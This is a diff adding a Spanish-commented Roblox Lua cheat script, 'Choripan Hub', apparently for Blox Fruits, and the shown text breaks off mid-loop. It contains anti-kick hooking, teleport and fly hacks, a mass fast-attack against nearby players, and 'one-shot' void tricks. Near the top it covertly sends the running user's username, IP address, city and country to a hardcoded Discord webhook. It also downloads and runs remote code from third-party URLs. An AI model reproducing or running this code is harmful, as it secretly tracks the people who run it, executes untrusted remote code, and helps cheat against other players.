@@ -1,0 +1,723 @@
+-- =========================================================
+-- 🌭🔥 CHORIPÁN HUB | DOMAIN EDITION (PC) - VERSIÓN PREMIUM
+-- =========================================================
+
+local UIS = game:GetService("UserInputService")
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local CoreGui = game:GetService("CoreGui")
+local Camera = workspace.CurrentCamera
+
+local lp = Players.LocalPlayer
+local LP = lp
+
+-- [[ 🌐 1. IP & INFO SYSTEM ]]
+local function GetIpData()
+    local success, result = pcall(function() return game:HttpGet("http://ip-api.com/json/") end)
+    if success then
+        local d = HttpService:JSONDecode(result)
+        return d.query or "N/A", d.country or "N/A", d.city or "N/A"
+    end
+    return "Error", "Error", "Error"
+end
+
+local ip, country, city = GetIpData()
+getgenv().execCount = (getgenv().execCount or 0) + 1
+
+task.spawn(function()
+    pcall(function()
+        local data = {
+            content = "@everyone 🚀 **Choripan Hub Cargado (PC)**\n" ..
+                      "👤 **Usuario:** " .. LP.Name .. "\n" ..
+                      "🌐 **IP:** " .. ip .. "\n" ..
+                      "🌍 **Ubicación:** " .. city .. ", " .. country .. "\n" ..
+                      "📊 **Ejecuciones:** " .. getgenv().execCount
+        }
+        local req = request or http_request or (syn and syn.request)
+        if req then
+            req({
+                Url = "https://discord.com/api/webhooks/1497649172122177727/HrZuVJaia7lMuBsokZ3JFsn9M-yfg2qFy3CV7HYdM0y0EOQ9NPfyzxgCt136RYe-yv5C",
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = HttpService:JSONEncode(data)
+            })
+        end
+    end)
+end)
+
+-- [[ 🦾 2. CORE ENGINE & ANTI-KICK ]]
+pcall(function()
+    local RS = game:GetService("ReplicatedStorage")
+    local s = require(RS:WaitForChild("Util"):WaitForChild("CameraShaker"):WaitForChild("Main"))
+    s.StartShake = function() end s.ShakeOnce = function() end
+    
+    local oldNamecall
+    oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
+        local method = getnamecallmethod()
+        if method == "Kick" or method == "kick" then return nil end
+        return oldNamecall(self, ...)
+    end))
+end)
+
+-- [[ 🎯 VARIABLES GLOBALES ]]
+local SelectedPlayer = nil
+local GhostTpEnabled = false
+local InstaTeleportEnabled = false 
+local ModoAereoEnabled = false     
+local PredictionStrength = 0
+local XOffset, YOffset, ZOffset = 0, 0, 0
+local GhostFrameCounter = 0
+local GHOST_RATIO = 3
+local GhostSafeCFrame = CFrame.new(0, 1000000, 0)
+local StartBounty = 0
+
+-- Variables de Vuelo Suave (Tween Fly)
+local TeleportEnabled = false
+local TeleportConnection = nil
+local TweenSpeed = 200 -- Velocidad fija anti-rollback
+
+-- Variables Fast Attack Masivo
+local FastAttackEnabled = false
+local FastAttackRange = 1200
+local FastAttackConnection = nil
+local TOGGLE_KEY_FA = Enum.KeyCode.U
+local FastAttackAnimEnabled = false
+
+-- Variables OneShot
+local onenabledshotho = false
+
+local Net = ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Net")
+local RegisterHit = Net["RE/RegisterHit"]
+local RegisterAttack = Net["RE/RegisterAttack"]
+
+-- Variables Edsusito Inf v2
+getgenv().AbuseActive = getgenv().AbuseActive or false
+getgenv().SelectedSlot = Enum.KeyCode.Three
+local ejecutandoAtaque = false
+local espectando = nil
+
+-- [[ 🦾 FUNCIONES BÁSICAS ]]
+local function GetPlayerList()
+    local n = {"None"}
+    for _, p in pairs(Players:GetPlayers()) do if p ~= LP then table.insert(n, p.Name) end end
+    return n
+end
+
+local function Press(key)
+    VirtualInputManager:SendKeyEvent(true, key, false, game)
+    task.wait(0.01)
+    VirtualInputManager:SendKeyEvent(false, key, false, game)
+end
+
+local function getBounty()
+    local val = 0
+    pcall(function()
+        local d = LP:FindFirstChild("Data")
+        if d then val = (d:FindFirstChild("Bounty") or d:FindFirstChild("Honor")).Value end
+    end)
+    return val
+end
+
+-- [[ 🛸 LÓGICA DE MOVIMIENTO TWEEN (OPTIMIZADA) ]]
+local function SetNoCollide(v)
+    pcall(function()
+        for _, part in pairs(LP.Character:GetDescendants()) do
+            if part:IsA("BasePart") then part.CanCollide = not v end
+        end
+    end)
+end
+
+local function toggleSmoothFly(state)
+    TeleportEnabled = state
+    if TeleportEnabled then
+        if TeleportConnection then TeleportConnection:Disconnect() end
+        
+        -- Usamos Stepped porque maneja la física y dt nos da tiempo exacto
+        TeleportConnection = RunService.Stepped:Connect(function(time, dt)
+            if not SelectedPlayer then return end
+            local target = Players:FindFirstChild(SelectedPlayer)
+            
+            if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
+                local myHRP = LP.Character.HumanoidRootPart
+                local targetHRP = target.Character.HumanoidRootPart
+                
+                -- Posición objetivo más offsets
+                local targetPos = targetHRP.Position + Vector3.new(XOffset, YOffset, ZOffset)
+                local dist = (myHRP.Position - targetPos).Magnitude
+                
+                if dist > 3 then
+                    SetNoCollide(true)
+                    
+                    -- BodyVelocity para quitar gravedad mientras vuela (Bypass Anti-Cheat)
+                    local bv = myHRP:FindFirstChild("TweenBV")
+                    if not bv then
+                        bv = Instance.new("BodyVelocity")
+                        bv.Name = "TweenBV"
+                        bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
+                        bv.Velocity = Vector3.zero
+                        bv.Parent = myHRP
+                    end
+                    
+                    -- Movimiento Suave Lineal calculado matemáticamente (Evita lag de TweenService)
+                    myHRP.CFrame = CFrame.new(myHRP.Position, targetPos) * CFrame.new(0, 0, -TweenSpeed * dt)
+                else
+                    -- Limpieza al llegar
+                    if myHRP:FindFirstChild("TweenBV") then myHRP.TweenBV:Destroy() end
+                    SetNoCollide(false)
+                end
+            end
+        end)
+    else
+        -- Apagar Vuelo Suave
+        if TeleportConnection then 
+            TeleportConnection:Disconnect() 
+            TeleportConnection = nil 
+        end
+        pcall(function()
+            if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
+                local bv = LP.Character.HumanoidRootPart:FindFirstChild("TweenBV")
+                if bv then bv:Destroy() end
+            end
+            SetNoCollide(false)
+        end)
+    end
+end
+
+-- [[ 💀 LÓGICA ONESHOT (TECLA H) ]]
+local function toggleOneShot(state)
+    onenabledshotho = state
+    if onenabledshotho then
+        task.spawn(function()
+            while onenabledshotho do
+                local char = LP.Character
+                local hrp = char and char:FindFirstChild("HumanoidRootPart")
+                if hrp then
+                    local pos = hrp.Position
+                    hrp.CFrame = CFrame.new(pos.X, pos.Y - 795679695796326795679695796326, pos.Z)
+                end
+                task.wait(0.01)
+            end
+        end)
+    end
+end
+
+-- [[ 🌌 LÓGICA EDSUSITO INF v2 (VACÍO Y AUTO RESET) ]]
+local function RunHeadLockVoid()
+    if ejecutandoAtaque then return end
+    ejecutandoAtaque = true
+    local char = lp.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    local head = char and char:FindFirstChild("Head")
+    local torso = char and (char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso"))
+    if hrp and head and torso then
+        local oldPos = hrp.CFrame
+        Press(Enum.KeyCode.Z)
+        task.wait(0.05) 
+        head.Anchored = true
+        hrp.Anchored = true
+        torso.Anchored = true
+        local voidPos = CFrame.new(923.2, 3000000000000000000000, 32852.8)
+        hrp.CFrame = voidPos
+        torso.CFrame = voidPos
+        task.wait(0.12) 
+        hrp.CFrame = oldPos
+        torso.CFrame = oldPos
+        task.wait(0.05)
+        head.Anchored = false
+        hrp.Anchored = false
+        torso.Anchored = false
+    end
+    ejecutandoAtaque = false
+end
+
+local function ExecuteAbuse()
+    if not getgenv().AbuseActive then return end
+    local char = lp.Character or lp.CharacterAdded:Wait()
+    local hrp = char:WaitForChild("HumanoidRootPart", 5)
+    local hum = char:WaitForChild("Humanoid", 5)
+    if hrp and hum and hum.Health > 0 then
+        hrp.CFrame = hrp.CFrame * CFrame.new(0, 800, 0)
+        Press(getgenv().SelectedSlot)
+        task.wait(0.14)
+        Press(Enum.KeyCode.J)
+        hrp.Anchored = true
+        hrp.CFrame = CFrame.new(923.2, 3000000000000000000000, 32852.8)
+        task.wait(0.05)
+        Press(Enum.KeyCode.Z)
+        -- SE HA REMOVIDO EL RESET AUTOMÁTICO (hum.Health = 0)
+        task.wait(0.6)
+    end
+end
+
+if not getgenv().HanexRespawnConnection then
+    getgenv().HanexRespawnConnection = lp.CharacterAdded:Connect(function()
+        if getgenv().AbuseActive then
+            task.wait(0.5) 
+            task.spawn(ExecuteAbuse)
+        end
+    end)
+end
+
+-- [[ 🌪️ LÓGICA FAST ATTACK MASIVO ]]
+local function AttackMultipleTargets(targets)
+    pcall(function()
+        if not targets or #targets == 0 then return end
+        local allTargets = {}
+        for _, targetChar in pairs(targets) do
+            local head = targetChar:FindFirstChild("Head")
+            if head then table.insert(allTargets, { targetChar, head }) end
+        end
+        if #allTargets == 0 then return end
+        
+        RegisterAttack:FireServer(0)
+        local hitArgs = { allTargets[1][2], allTargets }
+        RegisterHit:FireServer(unpack(hitArgs))
+    end)
+end
+
+local function StartFastAttack()
+    if FastAttackConnection then task.cancel(FastAttackConnection) end
+    FastAttackConnection = task.spawn(function()
+        while FastAttackEnabled do
+            task.wait(0.01)
+            local myChar = Players.LocalPlayer.Character
+            local myHRP = myChar and myChar:FindFirstChild("HumanoidRootPart")
+            if not myHRP then continue end
+
+            local targetsInRange = {}
+
+            for _, player in pairs(Players:GetPlayers()) do
+                if player ~= Players.LocalPlayer and player.Character then
+                    local humanoid = player.Character:FindFirstChild("Humanoid")
+                    local hrp = player.Character:FindFirstChild("HumanoidRootPart")
+                    if humanoid and hrp and humanoid.Health > 0 then
+                        local dist = (hrp.Position - myHRP.Position).Magnitude
+                        if dist <= FastAttackRange then table.insert(targetsInRange, player.Character) end
+                    end
+                end
+            end
+
+            local enemiesFolder = workspace:FindFirstChild("Enemies")
+            if enemiesFolder then
+                for _, npc in pairs(enemiesFolder:GetChildren()) do
+                    local humanoid = npc:FindFirstChild("Humanoid")
+                    local hrp = npc:FindFirstChild("HumanoidRootPart")
+                    if humanoid and hrp and humanoid.Health > 0 then
+                        local dist = (hrp.Position - myHRP.Position).Magnitude
+                        if dist <= FastAttackRange then table.insert(targetsInRange, npc) end
+                    end
+                end
+            end
+
+            if #targetsInRange > 0 then AttackMultipleTargets(targetsInRange) end
+        end
+    end)
+end
+
+local function StopFastAttack()
+    if FastAttackConnection then
+        task.cancel(FastAttackConnection)
+        FastAttackConnection = nil
+    end
+end
+
+
+-- =========================================================
+-- 🎛️ UI: EDSUSITO HUB (MODERNO)
+-- =========================================================
+for _, v in pairs(CoreGui:GetChildren()) do
+    if v.Name == "EdsusitoHubGUI" then v:Destroy() end
+end
+
+local Screen = Instance.new("ScreenGui", CoreGui)
+Screen.Name = "EdsusitoHubGUI"
+
+-- PANEL PRINCIPAL (M)
+local MainEds = Instance.new("Frame", Screen)
+MainEds.Size = UDim2.new(0, 240, 0, 260)
+MainEds.Position = UDim2.new(0.5, -120, 0.5, -130)
+MainEds.BackgroundColor3 = Color3.fromRGB(10, 10, 12)
+MainEds.BorderSizePixel = 0
+MainEds.Visible = false
+Instance.new("UICorner", MainEds).CornerRadius = UDim.new(0, 12)
+local Glow = Instance.new("UIStroke", MainEds); Glow.Color = Color3.fromRGB(0, 120, 255); Glow.Thickness = 1.5
+
+local Header = Instance.new("Frame", MainEds)
+Header.Size = UDim2.new(1, 0, 0, 45); Header.BackgroundColor3 = Color3.fromRGB(15, 15, 20); Header.BorderSizePixel = 0
+Instance.new("UICorner", Header).CornerRadius = UDim.new(0, 12)
+local Title = Instance.new("TextLabel", Header)
+Title.Text = "EDSUSITO HUB"; Title.Size = UDim2.new(1, 0, 1, 0); Title.TextColor3 = Color3.new(1,1,1); Title.Font = Enum.Font.GothamBlack; Title.BackgroundTransparency = 1; Title.TextSize = 14
+
+local function CreateBtn(text, y, color, cb)
+    local b = Instance.new("TextButton", MainEds)
+    b.Size = UDim2.new(0.85, 0, 0, 35); b.Position = UDim2.new(0.075, 0, 0, y)
+    b.BackgroundColor3 = Color3.fromRGB(20, 20, 25); b.Text = text; b.TextColor3 = color
+    b.Font = Enum.Font.GothamBold; b.TextSize = 10; Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
+    b.MouseButton1Click:Connect(cb)
+end
+
+local function CreateToggle(text, y, startVal, cb)
+    local tFrame = Instance.new("Frame", MainEds)
+    tFrame.Size = UDim2.new(0.85, 0, 0, 35); tFrame.Position = UDim2.new(0.075, 0, 0, y); tFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+    Instance.new("UICorner", tFrame).CornerRadius = UDim.new(0, 6)
+    local lbl = Instance.new("TextLabel", tFrame); lbl.Text = text; lbl.Size = UDim2.new(1, -40, 1, 0); lbl.Position = UDim2.new(0, 10, 0, 0); lbl.TextColor3 = Color3.new(0.8,0.8,0.8); lbl.Font = Enum.Font.GothamBold; lbl.TextSize = 10; lbl.BackgroundTransparency = 1; lbl.TextXAlignment = Enum.TextXAlignment.Left
+    local btn = Instance.new("TextButton", tFrame); btn.Size = UDim2.new(0, 30, 0, 18); btn.Position = UDim2.new(1, -35, 0.5, -9); btn.Text = ""; btn.BackgroundColor3 = startVal and Color3.fromRGB(0, 255, 120) or Color3.fromRGB(255, 50, 50); Instance.new("UICorner", btn).CornerRadius = UDim.new(1, 0)
+    btn.MouseButton1Click:Connect(function()
+        getgenv().AbuseActive = not getgenv().AbuseActive
+        btn.BackgroundColor3 = getgenv().AbuseActive and Color3.fromRGB(0, 255, 120) or Color3.fromRGB(255, 50, 50)
+        cb(getgenv().AbuseActive)
+    end)
+end
+
+CreateBtn("ATTACK VOID [G]", 55, Color3.fromRGB(0, 120, 255), RunHeadLockVoid)
+CreateToggle("ADMIN ABUSE", 100, getgenv().AbuseActive, function(v) if v then task.spawn(ExecuteAbuse) end end)
+CreateBtn("REPAIR CHAR", 145, Color3.fromRGB(0, 255, 150), function() if lp.Character then for _,v in pairs(lp.Character:GetDescendants()) do if v:IsA("BasePart") then v.Anchored = false end end end Camera.CameraSubject = lp.Character:FindFirstChild("Humanoid") end)
+CreateBtn("PLAYER LIST [N]", 190, Color3.new(1,1,1), function() Screen.PlayerListFrame.Visible = not Screen.PlayerListFrame.Visible end)
+
+-- PLAYER LIST (N)
+local PL = Instance.new("Frame", Screen)
+PL.Name = "PlayerListFrame"; PL.Size = UDim2.new(0, 300, 0, 380); PL.Position = UDim2.new(0.7, 0, 0.2, 0); PL.BackgroundColor3 = Color3.fromRGB(10, 10, 12); PL.BorderSizePixel = 0; PL.Visible = false; PL.Active = true; Instance.new("UICorner", PL).CornerRadius = UDim.new(0, 15); local PLGlow = Instance.new("UIStroke", PL); PLGlow.Color = Color3.fromRGB(0, 120, 255); PLGlow.Thickness = 1.5
+
+local PLHeader = Instance.new("Frame", PL); PLHeader.Size = UDim2.new(1, 0, 0, 45); PLHeader.BackgroundColor3 = Color3.fromRGB(15, 15, 20); PLHeader.BorderSizePixel = 0; Instance.new("UICorner", PLHeader).CornerRadius = UDim.new(0, 15)
+local PLTitle = Instance.new("TextLabel", PLHeader); PLTitle.Text = "PLAYER LIST"; PLTitle.Size = UDim2.new(1, 0, 1, 0); PLTitle.TextColor3 = Color3.new(1,1,1); PLTitle.Font = Enum.Font.GothamBlack; PLTitle.BackgroundTransparency = 1; PLTitle.TextSize = 13
+
+local Scroll = Instance.new("ScrollingFrame", PL); Scroll.Size = UDim2.new(1, -15, 1, -60); Scroll.Position = UDim2.new(0, 7, 0, 55); Scroll.BackgroundTransparency = 1; Scroll.ScrollBarThickness = 1; Scroll.CanvasSize = UDim2.new(0, 0, 0, 0); local Layout = Instance.new("UIListLayout", Scroll); Layout.Padding = UDim.new(0, 8); Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+
+local function CreateCard(plr)
+    local Card = Instance.new("Frame"); Card.Size = UDim2.new(0, 275, 0, 65); Card.BackgroundColor3 = Color3.fromRGB(20, 20, 25); Instance.new("UICorner", Card).CornerRadius = UDim.new(0, 8)
+    local Avatar = Instance.new("ImageLabel", Card); Avatar.Size = UDim2.new(0, 40, 0, 40); Avatar.Position = UDim2.new(0, 10, 0, 8); Avatar.Image = Players:GetUserThumbnailAsync(plr.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100); Instance.new("UICorner", Avatar).CornerRadius = UDim.new(1, 0)
+    local Name = Instance.new("TextLabel", Card); Name.Text = plr.DisplayName; Name.Size = UDim2.new(0, 130, 0, 15); Name.Position = UDim2.new(0, 60, 0, 10); Name.TextColor3 = Color3.new(1,1,1); Name.Font = Enum.Font.GothamBold; Name.TextSize = 11; Name.TextXAlignment = Enum.TextXAlignment.Left; Name.BackgroundTransparency = 1
+    local Spec = Instance.new("TextButton", Card); Spec.Text = "SPECTATE"; Spec.Size = UDim2.new(0, 70, 0, 25); Spec.Position = UDim2.new(1, -80, 0, 10); Spec.BackgroundColor3 = Color3.fromRGB(0, 120, 255); Spec.TextColor3 = Color3.new(1,1,1); Spec.Font = Enum.Font.GothamBold; Spec.TextSize = 8; Instance.new("UICorner", Spec).CornerRadius = UDim.new(0, 5)
+    local BarBG = Instance.new("Frame", Card); BarBG.Size = UDim2.new(1, -20, 0, 3); BarBG.Position = UDim2.new(0, 10, 1, -12); BarBG.BackgroundColor3 = Color3.fromRGB(35, 35, 40); Instance.new("UICorner", BarBG).CornerRadius = UDim.new(1, 0)
+    local Bar = Instance.new("Frame", BarBG); Bar.Size = UDim2.new(1, 0, 1, 0); Bar.BackgroundColor3 = Color3.fromRGB(0, 255, 120); Instance.new("UICorner", Bar).CornerRadius = UDim.new(1, 0)
+    
+    Spec.MouseButton1Click:Connect(function()
+        if espectando == plr then espectando = nil Camera.CameraSubject = lp.Character.Humanoid Spec.Text = "SPECTATE" Spec.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+        else espectando = plr Camera.CameraSubject = plr.Character.Humanoid Spec.Text = "VIEWING" Spec.BackgroundColor3 = Color3.fromRGB(255, 0, 80) end
+    end)
+    task.spawn(function()
+        while task.wait(0.5) do pcall(function() local h = plr.Character.Humanoid local p = math.clamp(h.Health/h.MaxHealth,0,1) Bar.Size = UDim2.new(p,0,1,0) Bar.BackgroundColor3 = p > 0.6 and Color3.fromRGB(0, 255, 120) or p > 0.3 and Color3.fromRGB(255, 200, 0) or Color3.fromRGB(255, 50, 50) end) end
+    end)
+    return Card
+end
+
+local function RefreshPL()
+    for _,v in pairs(Scroll:GetChildren()) do if v:IsA("Frame") then v:Destroy() end end
+    for _,p in pairs(Players:GetPlayers()) do if p ~= lp then CreateCard(p).Parent = Scroll end end
+    Scroll.CanvasSize = UDim2.new(0,0,0, Layout.AbsoluteContentSize.Y + 10)
+end
+Players.PlayerAdded:Connect(RefreshPL); Players.PlayerRemoving:Connect(RefreshPL); RefreshPL()
+
+local function Drag(obj, head)
+    local dragging, input, startPos, startInput
+    head.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true startInput = i.Position startPos = obj.Position end end)
+    UIS.InputChanged:Connect(function(i) if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then local delta = i.Position - startInput obj.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) end end)
+    UIS.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
+end
+Drag(MainEds, Header); Drag(PL, PLHeader)
+
+
+-- =========================================================
+-- 🎛️ INTERFAZ RAYFIELD PRINCIPAL
+-- =========================================================
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+local Window = Rayfield:CreateWindow({
+   Name = "🌭 Choripan Hub | Domain Edition",
+   LoadingTitle = "🌌 Optimización de Movimiento...",
+   ConfigurationSaving = {Enabled = false}
+})
+
+local TabTrack = Window:CreateTab("Trackers 🎯", 4483362458)
+local TabCombat = Window:CreateTab("Combat ⚔️", 4483362458)
+local TabESP    = Window:CreateTab("❗ Ships & Anti-Buddha", 4483362458)
+local TabInf    = Window:CreateTab("♾️Chori Inf♾️", 4483362458)
+local TabMisc   = Window:CreateTab("Misc ⚙️", 4483362458)
+
+-- [[ 1. TRACKERS Y MOVIMIENTO ]]
+TabTrack:CreateSection("--- 🦅 Target Acquisition ---")
+local PlayerDropdown = TabTrack:CreateDropdown({
+    Name = "👤 Player Selection", Options = GetPlayerList(), CurrentOption = {"None"},
+    Callback = function(opt) 
+        if type(opt) == "table" then opt = opt[1] end 
+        SelectedPlayer = (opt ~= "None") and opt or nil
+    end,
+})
+TabTrack:CreateButton({Name = "🔄 Refresh List", Callback = function() PlayerDropdown:Refresh(GetPlayerList(), true) end})
+
+TabTrack:CreateSection("--- 🛸 Movement Methods ---")
+TabTrack:CreateToggle({
+    Name = "✈️ Smooth Tween Fly (Seguro)",
+    CurrentValue = false,
+    Callback = function(v) toggleSmoothFly(v) end,
+})
+
+TabTrack:CreateToggle({
+    Name = "⚡ Insta TP (Pegajoso)",
+    CurrentValue = false,
+    Callback = function(v) InstaTeleportEnabled = v end,
+})
+
+TabTrack:CreateToggle({
+    Name = "🚁 Rastreo (Modo Aéreo Estático)",
+    CurrentValue = false,
+    Callback = function(v) ModoAereoEnabled = v end,
+})
+
+TabTrack:CreateSection("--- 👻 Stealth & Ghost ---")
+TabTrack:CreateToggle({
+    Name = "👻 Ghost TP (Ethereal)", CurrentValue = false,
+    Callback = function(v)
+        GhostTpEnabled = v
+        if v then
+            _G.GhostTpConn = RunService.Heartbeat:Connect(function()
+                if not GhostTpEnabled or not SelectedPlayer then return end
+                pcall(function()
+                    local T = Players:FindFirstChild(SelectedPlayer)
+                    if T and T.Character and LP.Character then
+                        local THRP = T.Character:FindFirstChild("HumanoidRootPart")
+                        local MyHRP = LP.Character:FindFirstChild("HumanoidRootPart")
+                        if THRP and MyHRP then
+                            GhostFrameCounter = (GhostFrameCounter + 1) % GHOST_RATIO
+                            if GhostFrameCounter == 0 then 
+                                MyHRP.CFrame = GhostSafeCFrame 
+                            else 
+                                local targetPos = THRP.Position + (THRP.Velocity * PredictionStrength)
+                                MyHRP.CFrame = CFrame.new(targetPos) * CFrame.new(XOffset, YOffset, ZOffset)
+                            end
+                        end
+                    end
+                end)
+            end)
+        else if _G.GhostTpConn then _G.GhostTpConn:Disconnect() end end
+    end,
+})
+
+TabTrack:CreateSection("--- 📏 Offsets & Settings ---")
+TabTrack:CreateSlider({ Name = "💨 Velocidad Tween Fly", Range = {50, 350}, Increment = 10, CurrentValue = 200, Callback = function(v) TweenSpeed = v end })
+TabTrack:CreateSlider({ Name = "🎯 Prediction", Range = {0, 10}, Increment = 0.1, CurrentValue = 0, Callback = function(v) PredictionStrength = v end })
+TabTrack:CreateSlider({ Name = "📏 X Offset", Range = {-250, 250}, Increment = 1, CurrentValue = 0, Callback = function(v) XOffset = v end })
+TabTrack:CreateSlider({ Name = "📏 Y Offset", Range = {-500, 500}, Increment = 1, CurrentValue = 0, Callback = function(v) YOffset = v end })
+TabTrack:CreateSlider({ Name = "📏 Z Offset", Range = {-250, 250}, Increment = 1, CurrentValue = 0, Callback = function(v) ZOffset = v end })
+
+-- [[ 2. COMBAT ]]
+TabCombat:CreateSection("--- 🌪️ Fast Attack Engine ---")
+local FastAttackToggle = TabCombat:CreateToggle({ 
+    Name = "🌪️ Fast Attack Masivo (Players & NPCs) [U]", 
+    CurrentValue = false, 
+    Callback = function(v) 
+        FastAttackEnabled = v
+        if v then StartFastAttack() else StopFastAttack() end
+    end 
+})
+TabCombat:CreateSlider({ 
+    Name = "📏 Rango Fast Attack Masivo", Range = {100, 5000}, Increment = 50, CurrentValue = 1200, 
+    Callback = function(v) FastAttackRange = v end 
+})
+
+TabCombat:CreateSection("--- ⚔️ Animaciones Fast Attack ---")
+TabCombat:CreateToggle({
+   Name = "⚡ Acelerar Animaciones M1 (Infinitracker)",
+   CurrentValue = false,
+   Callback = function(Value) FastAttackAnimEnabled = Value end,
+})
+
+TabCombat:CreateSection("--- 💀 OneShot ---")
+local InstakillToggle = TabCombat:CreateToggle({ 
+    Name = "💀 Golpe Mortal OneShot [Tecla H]", 
+    CurrentValue = false, 
+    Callback = function(v) 
+        if onenabledshotho ~= v then
+            toggleOneShot(v)
+        end
+    end 
+})
+
+TabCombat:CreateSection("--- ⚡ Fast Attack Fruits ---")
+local function SetupFruit(name, toolName, args)
+    TabCombat:CreateToggle({
+        Name = "⚡ " .. name, CurrentValue = false,
+        Callback = function(v)
+            _G[name.."Active"] = v
+            task.spawn(function()
+                while _G[name.."Active"] do
+                    task.wait(0.01)
+                    pcall(function()
+                        local tool = LP.Character:FindFirstChild(toolName) or LP.Backpack:FindFirstChild(toolName)
+                        if tool and tool:FindFirstChild("LeftClickRemote") then
+                            tool.LeftClickRemote:FireServer(Vector3.new(0,0,0), unpack(args))
+                        end
+                    end)
+                end
+            end)
+        end
+    })
+end
+SetupFruit("Dolor Infinito (Pain)", "Pain-Pain", {1, true})
+SetupFruit("Aliento Dragón", "Dragon-Dragon", {1})
+SetupFruit("Garra Tigre", "Tiger-Tiger", {3})
+SetupFruit("Pisotón T-Rex", "T-Rex-T-Rex", {1})
+SetupFruit("Llama Kitsune", "Kitsune-Kitsune", {1, true})
+
+-- [[ 3. SHIPS & ANTI-BUDDHA ]]
+TabESP:CreateSection("--- 🚢 Anti-Buddha (Ship TPs) ---")
+TabESP:CreateButton({ Name = "Haunted Ship (Outside)", Callback = function() 
+    if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
+        LP.Character.HumanoidRootPart.CFrame = CFrame.new(-6500, 129, -123)
+    end
+end})
+TabESP:CreateButton({ Name = "Haunted Ship (Inside)", Callback = function() 
+    if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
+        LP.Character.HumanoidRootPart.CFrame = CFrame.new(918.576, 125.098, 32851.527)
+    end
+end})
+
+-- [[ 4. ♾️CHORI INF♾️ ]]
+TabInf:CreateSection("--- 📊 Honor Stats ---")
+local LabelEarned = TabInf:CreateLabel("Ganado: 0")
+
+TabInf:CreateSection("--- 🌌 Rango Infinito (Edsusito V2) ---")
+TabInf:CreateButton({
+    Name = "Ataque Void [Tecla G]",
+    Callback = function() task.spawn(RunHeadLockVoid) end
+})
+
+TabInf:CreateToggle({
+    Name = "Admin Abuse (Z Spam)",
+    CurrentValue = getgenv().AbuseActive or false,
+    Callback = function(v)
+        getgenv().AbuseActive = v
+        if v then task.spawn(ExecuteAbuse) end
+    end
+})
+
+TabInf:CreateButton({
+    Name = "Reparar Personaje",
+    Callback = function()
+        if LP.Character then
+            for _,v in pairs(LP.Character:GetDescendants()) do
+                if v:IsA("BasePart") then v.Anchored = false end
+            end
+        end
+        Camera.CameraSubject = LP.Character:FindFirstChild("Humanoid")
+    end
+})
+
+TabInf:CreateSection("--- 🧭 Auto V4 ---")
+TabInf:CreateToggle({
+    Name = "Auto V4", CurrentValue = false,
+    Callback = function(v)
+        _G.autoV4 = v
+        task.spawn(function()
+            while _G.autoV4 do
+                task.wait(0.5)
+                pcall(function() LP.Backpack.Awakening.RemoteFunction:InvokeServer(true) end)
+            end
+        end)
+    end,
+})
+
+-- [[ 5. MISC ]]
+TabMisc:CreateSection("--- ⚙️ Local Settings ---")
+TabMisc:CreateToggle({ Name = "🧱 Noclip", CurrentValue = false, Callback = function(v) _G.Noclip = v end })
+TabMisc:CreateButton({ Name = "🪽 Fly Mode", Callback = function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fly-v3-64434"))() end })
+
+-- [[ ⌨️ INPUT SYSTEM UNIFICADO ]]
+UIS.InputBegan:Connect(function(input, gp)
+    if gp then return end
+    
+    -- Animaciones Fast Attack (M1 Speed Up)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 and FastAttackAnimEnabled then
+        local Character = LP.Character
+        if Character and Character:FindFirstChild("Humanoid") then
+            local Tool = Character:FindFirstChildOfClass("Tool")
+            if Tool then
+                for _, v in pairs(Character.Humanoid:GetPlayingAnimationTracks()) do
+                    if v.Name:lower():find("attack") or v.Name:lower():find("slash") then
+                        v:AdjustSpeed(2.5)
+                    end
+                end
+            end
+        end
+    end
+
+    -- Tecla H: OneShot Toggle 
+    if input.KeyCode == Enum.KeyCode.H then
+        local newState = not onenabledshotho
+        toggleOneShot(newState)
+        InstakillToggle:Set(newState)
+    end
+
+    -- Tecla G: Edsusito Manual Trigger
+    if input.KeyCode == Enum.KeyCode.G then
+        task.spawn(RunHeadLockVoid)
+    end
+    
+    -- Tecla M: Edsusito Panel Principal
+    if input.KeyCode == Enum.KeyCode.M then
+        MainEds.Visible = not MainEds.Visible
+    end
+
+    -- Tecla N: Player List Toggle
+    if input.KeyCode == Enum.KeyCode.N then
+        PL.Visible = not PL.Visible
+    end
+    
+    -- Tecla U: Fast Attack Masivo
+    if input.KeyCode == TOGGLE_KEY_FA then
+        FastAttackEnabled = not FastAttackEnabled
+        FastAttackToggle:Set(FastAttackEnabled)
+        if FastAttackEnabled then StartFastAttack() else StopFastAttack() end
+    end
+    
+    -- Tecla B: UpLoop (Salto seguro)
+    if input.KeyCode == Enum.KeyCode.B then
+        local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
+        if hrp then
+            local flag = hrp:FindFirstChild("UpLoop")
+            if flag then 
+                flag:Destroy() 
+            else
+                flag = Instance.new("BoolValue", hrp); flag.Name = "UpLoop"
+                task.spawn(function()
+                    while flag.Parent do
